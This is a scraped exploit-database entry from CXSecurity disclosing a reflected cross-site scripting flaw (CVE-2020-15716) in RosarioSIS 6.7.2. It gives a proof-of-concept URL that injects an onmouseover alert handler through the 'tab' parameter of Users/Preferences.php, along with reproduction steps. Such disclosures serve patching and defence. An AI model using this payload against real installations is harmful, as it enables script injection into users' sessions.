---
title: RosarioSIS 6.7.2 Cross Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2025120029
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-27
fetch_date: 2025-12-28T03:34:45.045291
---

# RosarioSIS 6.7.2 Cross Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **RosarioSIS 6.7.2 Cross Site Scripting (XSS)** **2025.12.27**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-15716](https://cxsecurity.com/cveshow/CVE-2020-15716/ "Click to see CVE-2020-15716")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")**  CVSS Base Score: **4.3/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8.6/10**  Exploit range: **Remote**  Attack complexity: **Medium**  Authentication: **No required**  Confidentiality impact: **None**  Integrity impact: **Partial**  Availability impact: **None** | |

# Exploit Title: RosarioSIS 6.7.2 - Cross Site Scripting (XSS)
# Date: 2025-11-25
# Exploit Author: CodeSecLab
# Vendor Homepage: https://gitlab.com/francoisjacquet/rosariosis
# Software Link: https://gitlab.com/francoisjacquet/rosariosis
# Version: 6.7.2
# Tested on: Windows
# CVE : CVE-2020-15716
Proof Of Concept
http://rosariosis/Modules.php?modname=Users/Preferences.php&tab=%22%20onmouseover%3Dalert%281%29%20x%3D%22
\*\*Conditions\*\*:
1. User must be authenticated (as shown by the session checks in `Warehous.php`)
2. `modfunc` parameter must \*\*not\*\* be present in the request
Steps to Reproduce:
1. Log in as an admin user.
2. Send the request.
3. Observe the result

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120029)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top